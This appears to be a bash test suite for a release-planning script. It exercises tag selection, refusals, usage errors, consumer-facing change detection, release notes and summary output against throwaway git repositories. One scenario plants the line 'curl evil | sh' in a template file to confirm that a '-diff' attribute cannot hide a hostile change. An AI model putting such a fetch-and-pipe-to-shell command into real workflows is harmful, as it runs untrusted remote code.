#!/usr/bin/env bash
# shellcheck disable=SC1091
# Tests for .github/scripts/release-plan.sh (#486): the tag it computes, every refusal, the
# consumer-facing paths, the Release notes and the approver's summary. Offline: every scenario runs
# against a throwaway git repository built here, with lightweight and annotated `vX.Y` tags.
# Needs bash, git, coreutils.
set -uo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
suite release-plan

PLAN="$ROOT_DIR/.github/scripts/release-plan.sh"
unset GITHUB_OUTPUT
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

g() { git -C "$R" -c core.autocrlf=false -c user.name=t -c user.email=t@t -c commit.gpgsign=false -c tag.gpgsign=false -c init.defaultBranch=main "$@"; }
wr() { mkdir -p "$R/$(dirname "$1")"; printf '%s' "$2" > "$R/$1"; } # path content
commit() { g add -A && g commit -q -m "$1"; }
head_sha() { g rev-parse HEAD; }

PIN_A=1111111111111111111111111111111111111111
PIN_B=2222222222222222222222222222222222222222
pin_line() { printf '    uses: 603-Identity/devcontainers/.github/workflows/%s@%s # %s\n' "$1" "$2" "$3"; }
write_pinned() { # path sha tag: a file with two self-pins and other lines around them
  mkdir -p "$R/$(dirname "$1")"
  {
    printf 'name: x\njobs:\n  a:\n'
    pin_line verify-devcontainer-image.yml "$2" "$3"
    printf '  b:\n'
    pin_line devcontainer-bump-decision.yml "$2" "$3"
    printf 'tail: 1\n'
  } > "$R/$1"
}
SELF_PINS=(tools/gate-template.yml.in template/.github/workflows/architect-review-gate.yml template/.github/workflows/devcontainer-image.yml template/.github/workflows/secret-scan.yml)
CONSUMER_FILES=(
  tools/devc-verify/main.go template/.devcontainer/Dockerfile tools/gate-template.yml.in
  .github/workflows/verify-devcontainer-image.yml .github/workflows/devcontainer-bump-decision.yml .github/workflows/secret-scan.yml
  tools/decide-bump.sh tools/fetch-consumer.sh tools/secret-scan.sh tools/secret-scan-lint.sh images/base/files/secret-scan/org.toml
)

# BASE: main at c0 tagged v1.0 (annotated), as the repository stands right after a release.
BASE="$WORK/base"
R="$BASE"
git init -q -b main "$R"
wr tools/devc-verify/main.go $'package main\n'
wr tools/devc-verify/templates/previous.devcontainer.json $'{ "t": "previous" }\n'
wr template/.devcontainer/devcontainer.json $'{ "t": "v1.0" }\n'
wr template/.devcontainer/Dockerfile $'# syntax=x\nFROM scratch\n'
for f in "${SELF_PINS[@]}"; do write_pinned "$f" "$PIN_A" v1.0; done
wr .github/workflows/verify-devcontainer-image.yml $'name: v\n'
wr .github/workflows/devcontainer-bump-decision.yml $'name: d\n'
wr .github/workflows/secret-scan.yml $'name: s\n'
write_pinned tools/decide-bump.sh "$PIN_A" v1.0
wr tools/fetch-consumer.sh $'echo f\n'
wr tools/secret-scan.sh $'echo s\n'
wr tools/secret-scan-lint.sh $'echo l\n'
wr images/base/files/secret-scan/org.toml $'a = 1\n'
wr images/base/Dockerfile $'FROM scratch\nARG BETTERLEAKS_VERSION=1.0.0\nARG BETTERLEAKS_SHA256=aaaa\nRUN true\n'
wr README.md $'readme\n'
commit c0
g tag -a v1.0 -m v1.0

SCENARIO=0
scenario() { # fresh copy of BASE in $R
  SCENARIO=$((SCENARIO + 1))
  R="$WORK/s$SCENARIO"
  cp -a "$BASE" "$R"
}
run_plan() { # args...  -> RC OUT ERR; runs in $R
  RC=0
  OUT="$(cd "$R" && bash "$PLAN" "$@" 2> "$WORK/err")" || RC=$?
  ERR="$(cat "$WORK/err")"
}
absent() { if [ ! -e "$2" ]; then pass; else fail "$1" "$2 exists"; fi; } # description path
has() { # description haystack needle
  if [[ "$2" == *"$3"* ]]; then pass; else fail "$1" "wanted '$3' in: $2"; fi
}
lacks() {
  if [[ "$2" != *"$3"* ]]; then pass; else fail "$1" "did not want '$3' in: $2"; fi
}
outline() { printf '%s\n' "$OUT" | sed -n "s/^$1=//p"; }
expect_plan() { # description rc prev tag
  assert_rc "$1" "$2" "$RC"
  if [ "$2" -eq 0 ]; then
    assert_eq "$1 (prev)" "$3" "$(outline prev)"
    assert_eq "$1 (tag)" "$4" "$(outline tag)"
  fi
}
consumer_commit() { printf 'x\n' >> "$R/tools/devc-verify/main.go"; commit consumer; }

# --- the tag ---------------------------------------------------------------------------------
scenario; consumer_commit; S="$(head_sha)"
run_plan plan minor "$S" real; expect_plan "minor from v1.0" 0 v1.0 v1.1
run_plan plan major "$S" real; expect_plan "major from v1.0" 0 v1.0 v2.0
run_plan plan minor "$S" dry; expect_plan "dry run computes the same tag" 0 v1.0 v1.1

# The previous tag is the newest one merged into the SHA, not a newer unreachable one.
scenario; g branch side; consumer_commit; S="$(head_sha)"
g checkout -q side; g commit -q --allow-empty -m side; g tag v1.5; g checkout -q main
run_plan plan major "$S" real; expect_plan "an unreachable v1.5 is not the previous tag" 0 v1.0 v2.0

# Tags that are not of the vX.Y shape are ignored when choosing the previous tag.
scenario
for t in v1.08 v1.0-rc1 vfoo v1.2.3 v01.0 v1. v.1; do g tag "$t" 2> /dev/null; done
consumer_commit; S="$(head_sha)"
run_plan plan minor "$S" real; expect_plan "tags of other shapes (v1.08 included) are ignored" 0 v1.0 v1.1

# --- numeric order ---------------------------------------------------------------------------
scenario; g tag v1.9; consumer_commit; g tag v1.10; consumer_commit; S="$(head_sha)"
run_plan plan minor "$S" real; expect_plan "v1.10 is newer than v1.9" 0 v1.10 v1.11
scenario; g tag v1.10; consumer_commit; g tag v2.0; consumer_commit; S="$(head_sha)"
run_plan plan minor "$S" real; expect_plan "v2.0 is newer than v1.10" 0 v2.0 v2.1

scenario; g tag v1.9; consumer_commit; S="$(head_sha)"
g branch side HEAD~1; g checkout -q side; g commit -q --allow-empty -m side; g tag v1.10; g checkout -q main
run_plan plan minor "$S" real
expect_plan "an unreachable v1.10 makes v1.10 from v1.9 refuse" 1
has "refused as existing" "$ERR" "the tag v1.10 already exists"

scenario; g tag v1.10; consumer_commit; S="$(head_sha)"
g checkout -q -b side HEAD~1; g commit -q --allow-empty -m side; g tag v2.0; g checkout -q main
run_plan plan minor "$S" real
expect_plan "an unreachable v2.0 makes a minor from v1.10 refuse" 1
has "refused as non-forward" "$ERR" "is not newer than v2.0"
run_plan plan minor "$S" dry
expect_plan "the non-forward refusal holds on dry too" 1
has "dry: non-forward" "$ERR" "is not newer than v2.0"

# --- refusals --------------------------------------------------------------------------------
scenario; consumer_commit; S="$(head_sha)"; g tag v1.7-lw
for mode in real dry; do
  run_plan plan minor "$S" "$mode"; expect_plan "a lightweight tag on the SHA refuses ($mode)" 1
  has "names the tag ($mode)" "$ERR" "already the target of the tag v1.7-lw"
done
scenario; consumer_commit; S="$(head_sha)"; g tag -a v1.7 -m ann
for mode in real dry; do
  run_plan plan minor "$S" "$mode"; expect_plan "an annotated tag on the SHA refuses ($mode)" 1
  has "peeled tag named ($mode)" "$ERR" "already the target of the tag v1.7"
done
scenario; consumer_commit; S="$(head_sha)"; g tag vfoo
for mode in real dry; do
  run_plan plan minor "$S" "$mode"; expect_plan "a v* tag of another shape on the SHA refuses ($mode)" 1
  has "other shape named ($mode)" "$ERR" "already the target of the tag vfoo"
done

scenario; consumer_commit; S="$(head_sha)"
g checkout -q -b side HEAD~1; g commit -q --allow-empty -m side; g tag v1.1; g checkout -q main
for mode in real dry; do
  run_plan plan minor "$S" "$mode"; expect_plan "an existing next tag refuses ($mode)" 1
  has "existing named ($mode)" "$ERR" "the tag v1.1 already exists"
done

scenario; g tag -d v1.0 > /dev/null; consumer_commit; S="$(head_sha)"
for mode in real dry; do
  run_plan plan minor "$S" "$mode"; expect_plan "no vX.Y tag reachable refuses ($mode)" 1
  has "no tag named ($mode)" "$ERR" "no vX.Y tag is reachable"
done
scenario; g tag -d v1.0 > /dev/null; g tag vfoo; consumer_commit; S="$(head_sha)"
run_plan plan minor "$S" real; expect_plan "only a v* tag of another shape: refuses" 1

# --- usage errors ----------------------------------------------------------------------------
scenario; consumer_commit; S="$(head_sha)"
for b in patch "" $'minor\n' $'minor\nmajor' Minor; do
  run_plan plan "$b" "$S" real; assert_rc "bump '${b//$'\n'/\\n}' is a usage error" 2 "$RC"
done
for m in "" Dry real2 $'dry\n' both; do
  run_plan plan minor "$S" "$m"; assert_rc "mode '${m//$'\n'/\\n}' is a usage error" 2 "$RC"
done
UP="$(printf '%s' "$S" | tr a-f A-F)"
for s in "" abc "${S:0:39}" "${S}0" "$UP" "$S"$'\n' "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"; do
  run_plan plan minor "$s" real; assert_rc "SHA '${s:0:12}' is a usage error" 2 "$RC"
done
run_plan frobnicate; assert_rc "an unknown subcommand" 2 "$RC"
run_plan; assert_rc "no subcommand" 2 "$RC"
run_plan plan minor "$S"; assert_rc "plan with too few arguments" 2 "$RC"
run_plan plan; assert_rc "plan with none" 2 "$RC"
run_plan plan minor "$S" real extra; assert_rc "plan with too many arguments" 2 "$RC"
run_plan mode; assert_rc "mode with none" 2 "$RC"
run_plan mode true false; assert_rc "mode with too many" 2 "$RC"
run_plan notes v1.0 v1.1 "$S"; assert_rc "notes with too few" 2 "$RC"
run_plan notes v1.0 v1.1 "$S" "$WORK/o" x; assert_rc "notes with too many" 2 "$RC"
run_plan summary v1.0 v1.1 "$S" real; assert_rc "summary with too few" 2 "$RC"
run_plan summary v1.0 v1.1 "$S" real "$WORK/o" x; assert_rc "summary with too many" 2 "$RC"

# --- mode ------------------------------------------------------------------------------------
run_plan mode true; assert_rc "mode true" 0 "$RC"; assert_eq "true is dry" dry "$OUT"
run_plan mode false; assert_rc "mode false" 0 "$RC"; assert_eq "false is real" real "$OUT"
for v in True FALSE "" yes 1 $'true\n'; do
  run_plan mode "$v"; assert_rc "mode '${v//$'\n'/\\n}' is a usage error" 2 "$RC"
done

# --- consumer-facing paths -------------------------------------------------------------------
scenario; printf 'more\n' >> "$R/README.md"; commit docs; S="$(head_sha)"
run_plan plan minor "$S" real
assert_rc "no consumer-facing change refuses on real" 1 "$RC"
has "real: named" "$ERR" "nothing a consumer pins has changed since v1.0"
run_plan plan minor "$S" dry
assert_rc "no consumer-facing change only warns on dry" 0 "$RC"
has "dry: warning" "$OUT" "::warning::nothing a consumer pins"
assert_eq "dry: consumer_changed" false "$(outline consumer_changed)"
assert_eq "dry: the tag is still computed" v1.1 "$(outline tag)"

scenario; printf 'RUN more\n' >> "$R/images/base/Dockerfile"; commit dockerfile; S="$(head_sha)"
run_plan plan minor "$S" dry
assert_eq "a Dockerfile change outside the BETTERLEAKS_ ARGs is not consumer-facing" false "$(outline consumer_changed)"
scenario; sed -i 's/^ARG BETTERLEAKS_VERSION=.*/ARG BETTERLEAKS_VERSION=2.0.0/' "$R/images/base/Dockerfile"; commit bl-version; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "BETTERLEAKS_VERSION alone counts" 0 "$RC"
assert_eq "BETTERLEAKS_VERSION consumer_changed" true "$(outline consumer_changed)"
scenario; sed -i 's/^ARG BETTERLEAKS_SHA256=.*/ARG BETTERLEAKS_SHA256=bbbb/' "$R/images/base/Dockerfile"; commit bl-sha; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "BETTERLEAKS_SHA256 alone counts" 0 "$RC"
assert_eq "BETTERLEAKS_SHA256 consumer_changed" true "$(outline consumer_changed)"

for f in "${CONSUMER_FILES[@]}"; do
  scenario; printf '# changed\n' >> "$R/$f"; commit "touch $f"; S="$(head_sha)"
  run_plan plan minor "$S" real
  assert_rc "a change to $f counts" 0 "$RC"
  assert_eq "$f consumer_changed" true "$(outline consumer_changed)"
done
scenario; wr template/.devcontainer/new-file.json $'{}\n'; commit "new file in template"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a new file under template/ counts" 0 "$RC"

# The routine pin-bump commit: every self-pin moves, and the snapshot is rotated to the previous
# tag's template (template/.devcontainer/devcontainer.json at v1.0).
pin_bump() {
  local f
  for f in "${SELF_PINS[@]}"; do write_pinned "$f" "$PIN_B" v1.1; done
  cp "$R/template/.devcontainer/devcontainer.json" "$R/tools/devc-verify/templates/previous.devcontainer.json"
}
scenario; pin_bump; commit pin-bump; S="$(head_sha)"
run_plan plan minor "$S" real
assert_rc "a pin-bump-shaped range is not consumer-facing (real refuses)" 1 "$RC"
run_plan plan minor "$S" dry
assert_eq "pin-bump-shaped: consumer_changed" false "$(outline consumer_changed)"
scenario; pin_bump; printf '# one more line\n' >> "$R/tools/devc-verify/main.go"; commit "pin bump plus one change"; S="$(head_sha)"
run_plan plan minor "$S" real
assert_rc "the same commit plus one other changed line counts" 0 "$RC"
scenario; pin_bump; printf 'extra: 1\n' >> "$R/template/.github/workflows/secret-scan.yml"; commit "pin bump plus a non-pin line in a self-pin file"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a non-pin line changed in a self-pin file counts" 0 "$RC"

scenario; pin_line verify-devcontainer-image.yml "$PIN_B" v1.1 >> "$R/template/.github/workflows/secret-scan.yml"; commit "pin added"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a pin-shaped line added on one side only counts" 0 "$RC"
scenario; sed -i '/devcontainer-bump-decision.yml@/d' "$R/template/.github/workflows/architect-review-gate.yml"; commit "pin removed"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a pin-shaped line removed on one side only counts" 0 "$RC"
scenario; sed -i -E 's|devcontainer-bump-decision.yml@[0-9a-f]{40} # v1.0|secret-scan.yml@'"$PIN_B"' # v1.1|' "$R/template/.github/workflows/architect-review-gate.yml"; commit "pin retargeted"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a pin line whose workflow changed counts" 0 "$RC"
scenario; write_pinned tools/decide-bump.sh "$PIN_B" v1.1; commit "pin in another listed path"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a pin-shaped line changed in another listed path counts" 0 "$RC"
scenario; write_pinned .github/workflows/secret-scan.yml "$PIN_B" v1.1; commit "pin in a reusable workflow"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a pin-shaped line changed in a reusable workflow counts" 0 "$RC"

scenario; pin_bump; g rm -q -f tools/devc-verify/templates/previous.devcontainer.json; commit "pin bump, snapshot deleted"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "pins plus a deleted snapshot counts" 0 "$RC"
scenario; pin_bump; printf '{ "t": "other" }\n' > "$R/tools/devc-verify/templates/previous.devcontainer.json"; commit "pin bump, wrong snapshot"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "pins plus a snapshot unlike the previous tag's template counts" 0 "$RC"
scenario; pin_bump; rm "$R/tools/devc-verify/templates/previous.devcontainer.json"
ln -s ../../../template/.devcontainer/devcontainer.json "$R/tools/devc-verify/templates/previous.devcontainer.json"; commit "pin bump, snapshot a symlink"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "pins plus a snapshot that is a symlink counts" 0 "$RC"
# A template changed in the same range makes the new template differ from the snapshot's source:
# the rotation still has to match the template AT THE PREVIOUS TAG.
scenario; pin_bump; printf '{ "t": "v1.1-new" }\n' > "$R/template/.devcontainer/devcontainer.json"; commit "pin bump, template changed, snapshot copied from the new template"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a snapshot copied from the NEW template counts" 0 "$RC"

# A .gitattributes `-diff` entry must not hide a changed line from the pin-bump discount.
scenario; pin_bump; printf 'run: curl evil | sh\n' >> "$R/tools/gate-template.yml.in"
printf 'tools/gate-template.yml.in -diff\n' > "$R/.gitattributes"; commit "pin bump plus a hidden change"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_rc "a -diff attribute does not hide a changed line in a self-pin file" 0 "$RC"
assert_eq "...it is consumer-facing" true "$(outline consumer_changed)"

# template_changed
scenario; printf '# t\n' >> "$R/template/.devcontainer/Dockerfile"; commit "dev-app template"; S="$(head_sha)"
run_plan plan minor "$S" real; assert_eq "template_changed for template/.devcontainer/" true "$(outline template_changed)"
scenario; printf '# t\n' >> "$R/template/.github/workflows/secret-scan.yml"; commit "gate template"; S="$(head_sha)"
run_plan plan minor "$S" real
assert_eq "template_changed is false for template/.github/ alone" false "$(outline template_changed)"
assert_eq "...though it is consumer-facing" true "$(outline consumer_changed)"

# --- outputs ---------------------------------------------------------------------------------
scenario; consumer_commit; S="$(head_sha)"
GO="$WORK/github-output"; : > "$GO"
RC=0; (cd "$R" && GITHUB_OUTPUT="$GO" bash "$PLAN" plan minor "$S" real > /dev/null 2>&1) || RC=$?
assert_rc "plan with GITHUB_OUTPUT set" 0 "$RC"
assert_eq "the four output lines are appended" "prev=v1.0
tag=v1.1
consumer_changed=true
template_changed=false" "$(cat "$GO")"
RC=0; (cd "$R" && GITHUB_OUTPUT="$GO" bash "$PLAN" plan major "$S" dry > /dev/null 2>&1) || RC=$?
assert_eq "a second run appends rather than truncates" 8 "$(wc -l < "$GO" | tr -d ' ')"
before="$(cd "$R" && find . -path ./.git -prune -o -type f -print | sort | md5sum)"
run_plan plan minor "$S" real
after="$(cd "$R" && find . -path ./.git -prune -o -type f -print | sort | md5sum)"
assert_eq "no output file is written when GITHUB_OUTPUT is unset" "$before" "$after"
has "the lines still go to stdout" "$OUT" "tag=v1.1"
# A refusal appends nothing.
: > "$GO"
scenario; printf 'm\n' >> "$R/README.md"; commit docs; S="$(head_sha)"
RC=0; (cd "$R" && GITHUB_OUTPUT="$GO" bash "$PLAN" plan minor "$S" real > /dev/null 2>&1) || RC=$?
assert_rc "a refused plan" 1 "$RC"
assert_eq "a refusal appends nothing" 0 "$(wc -c < "$GO" | tr -d ' ')"

# --- notes -----------------------------------------------------------------------------------
# main: c0 (v1.0) -> side merged with --no-ff -> consumer commit; the merged commit's own subject
# must not appear because the log is first-parent.
scenario
g checkout -q -b side; g commit -q --allow-empty -m "side-only subject"; g checkout -q main
printf 'a\n' >> "$R/README.md"; commit "first on main"
g merge -q --no-ff side -m "Merge side"
consumer_commit; S="$(head_sha)"
OUTF="$WORK/notes-out"; rm -f "$OUTF"
run_plan notes v1.0 v1.1 "$S" "$OUTF"
assert_rc "generated notes" 0 "$RC"
assert_eq "notes print nothing on stdout" "" "$OUT"
N="$(cat "$OUTF")"
has "has the consumer subject" "$N" "- consumer"
has "has the first-parent merge subject" "$N" "- Merge side"
has "has a main subject" "$N" "- first on main"
lacks "leaves out the side-branch subject" "$N" "side-only subject"
lacks "no N/N-1 paragraph when the dev-App template did not change" "$N" "dev-App template changed"
has "ends with the pin-bump next step" "$(tail -n 1 "$OUTF")" "pin-bump PR"
has "the next step names the README section" "$(tail -n 1 "$OUTF")" "Cutting a release"

scenario; printf '# t\n' >> "$R/template/.devcontainer/Dockerfile"; commit "template change"; S="$(head_sha)"
run_plan notes v1.0 v1.1 "$S" "$OUTF"; assert_rc "generated notes with a template change" 0 "$RC"
N="$(cat "$OUTF")"
has "N/N-1 paragraph when template/.devcontainer/ changed" "$N" "dev-App template changed"
has "...naming the verify failure" "$N" "verify / verify"
scenario; printf '# t\n' >> "$R/template/.github/workflows/secret-scan.yml"; commit "gate template change"; S="$(head_sha)"
run_plan notes v1.0 v1.1 "$S" "$OUTF"
lacks "no N/N-1 paragraph for template/.github/ alone" "$(cat "$OUTF")" "dev-App template changed"

# Curated notes: the blob at the SHA, byte for byte, nothing appended; never the working tree.
CURATED=$'Curated \xe2\x80\x94 notes\r\n\n```\nno trailing newline'
scenario; wr docs/releases/v1.1.md "$CURATED"; commit "curated"; S="$(head_sha)"
printf 'WORKING TREE EDIT' > "$R/docs/releases/v1.1.md"
rm -f "$OUTF"; run_plan notes v1.0 v1.1 "$S" "$OUTF"
assert_rc "curated notes" 0 "$RC"
assert_eq "nothing on stdout" "" "$OUT"
printf '%s' "$CURATED" > "$WORK/curated.expect"
if cmp -s "$WORK/curated.expect" "$OUTF"; then pass; else fail "curated notes are the committed blob byte for byte"; fi

scenario; wr docs/releases/real.md "x"; mkdir -p "$R/docs/releases"; ln -s real.md "$R/docs/releases/v1.1.md"; commit "symlink"; S="$(head_sha)"
rm -f "$OUTF"; run_plan notes v1.0 v1.1 "$S" "$OUTF"
assert_rc "a symlink at docs/releases/<tag>.md refuses" 1 "$RC"; has "symlink message" "$ERR" "not a regular file"
absent "a refused notes run writes nothing" "$OUTF"
scenario; wr docs/releases/v1.1.md "x"; chmod +x "$R/docs/releases/v1.1.md"; commit "exec"; S="$(head_sha)"
run_plan notes v1.0 v1.1 "$S" "$OUTF"; assert_rc "an executable (100755) file refuses" 1 "$RC"
scenario; wr docs/releases/v1.1.md/inner.md "x"; commit "dir"; S="$(head_sha)"
run_plan notes v1.0 v1.1 "$S" "$OUTF"; assert_rc "a directory at the path refuses" 1 "$RC"

scenario; consumer_commit; S="$(head_sha)"
rm -f "$OUTF"
run_plan notes v1.0 v1.1 "$S" ""; assert_rc "an empty output path is a usage error" 2 "$RC"
run_plan notes v1.0 v1.1 "$S"; assert_rc "a missing output path is a usage error" 2 "$RC"
absent "nothing written without a path" "$OUTF"
run_plan notes v1.00 v1.1 "$S" "$OUTF"; assert_rc "a malformed previous tag" 2 "$RC"
run_plan notes v1.0 v01.1 "$S" "$OUTF"; assert_rc "a malformed new tag" 2 "$RC"
run_plan notes v1.0 v1.1 "${S:0:39}" "$OUTF"; assert_rc "a malformed SHA" 2 "$RC"
run_plan notes v1.0 v1.1 "$UP" "$OUTF"; assert_rc "an uppercase SHA" 2 "$RC"
absent "usage errors write nothing" "$OUTF"
run_plan notes v1.4 v1.5 "$S" "$OUTF"; assert_rc "a previous tag that does not exist refuses" 1 "$RC"
has "...and says so" "$ERR" "does not exist"
g checkout -q -b side HEAD~1; g commit -q --allow-empty -m other; g tag v1.2; g checkout -q main
run_plan notes v1.2 v1.3 "$S" "$OUTF"; assert_rc "a previous tag that is not an ancestor refuses" 1 "$RC"
has "...and says so" "$ERR" "not an ancestor"
absent "refusals write nothing" "$OUTF"

# --- summary ---------------------------------------------------------------------------------
scenario; consumer_commit; S="$(head_sha)"
NOTES="$WORK/notes.md"
fence_between() { # prints the lines between the first and last line that equal $1
  awk -v f="$1" '$0 == f { n++; if (n == 1) { inside = 1; next } } inside && $0 == f { exit } inside { print }' "$2"
}
printf '%s\n' '## Changes' '- <!-- hidden' '- </details>' '- new tag: v9.9' '- commit: 0000000000000000000000000000000000000000' '- ````' 'x' > "$NOTES"
run_plan summary v1.0 v1.1 "$S" real "$NOTES"
assert_rc "summary" 0 "$RC"
plan_line="$(printf '%s\n' "$OUT" | grep -n -m1 -F -- '- new tag: v1.1' | cut -d: -f1)"
first_fence="$(printf '%s\n' "$OUT" | grep -n -m1 -x '`````' | cut -d: -f1)"
if [ -n "$plan_line" ] && [ -n "$first_fence" ] && [ "$plan_line" -lt "$first_fence" ]; then pass
else fail "the plan lines come before the notes" "plan at $plan_line, fence at $first_fence"; fi
has "the plan has the SHA" "$OUT" "$S"
has "the plan has the mode" "$OUT" "mode: real"
has "the plan has the previous tag" "$OUT" "previous tag: v1.0"
printf '%s\n' "$OUT" > "$WORK/summary.out"
fence_between '`````' "$WORK/summary.out" > "$WORK/inside"
if cmp -s "$WORK/inside" "$NOTES"; then pass; else fail "notes appear byte for byte inside a five-backtick fence (one longer than the four-backtick run)"; fi
assert_eq "the fence closes exactly once" 2 "$(grep -c -x '`````' "$WORK/summary.out")"

printf 'plain notes, no backticks\n' > "$NOTES"
run_plan summary v1.0 v1.1 "$S" dry "$NOTES"; assert_rc "summary, plain notes" 0 "$RC"
printf '%s\n' "$OUT" > "$WORK/summary.out"
fence_between '```' "$WORK/summary.out" > "$WORK/inside"
if cmp -s "$WORK/inside" "$NOTES"; then pass; else fail "notes without backticks get a fence of three"; fi
has "dry mode shown" "$OUT" "mode: dry"
printf 'one backtick \x60 and two \x60\x60 only\n' > "$NOTES"
run_plan summary v1.0 v1.1 "$S" dry "$NOTES"
assert_eq "a fence is at least three even for short runs" 2 "$(printf '%s\n' "$OUT" | grep -c -x '```')"
printf 'no newline at the end' > "$NOTES"
run_plan summary v1.0 v1.1 "$S" dry "$NOTES"
assert_eq "the closing fence starts a line when the notes lack a final newline" 2 "$(printf '%s\n' "$OUT" | grep -c -x '```')"

run_plan summary v1.0 v1.1 "$S" real "$WORK/missing.md"; assert_rc "a missing notes file refuses" 1 "$RC"
printf 'x\n' > "$WORK/noread.md"; chmod 000 "$WORK/noread.md"
if [ -r "$WORK/noread.md" ]; then
  # Running as root: a mode-000 file is still readable, so use a directory as the unreadable notes.
  mkdir -p "$WORK/notes-dir"
  run_plan summary v1.0 v1.1 "$S" real "$WORK/notes-dir"
else
  run_plan summary v1.0 v1.1 "$S" real "$WORK/noread.md"
fi
assert_rc "an unreadable notes file refuses" 1 "$RC"
chmod 600 "$WORK/noread.md"
run_plan summary v1.00 v1.1 "$S" real "$NOTES"; assert_rc "summary: malformed previous tag" 2 "$RC"
run_plan summary v1.0 v1 "$S" real "$NOTES"; assert_rc "summary: malformed new tag" 2 "$RC"
run_plan summary v1.0 v1.1 "$UP" real "$NOTES"; assert_rc "summary: malformed SHA" 2 "$RC"
run_plan summary v1.0 v1.1 "$S" maybe "$NOTES"; assert_rc "summary: malformed mode" 2 "$RC"

summary
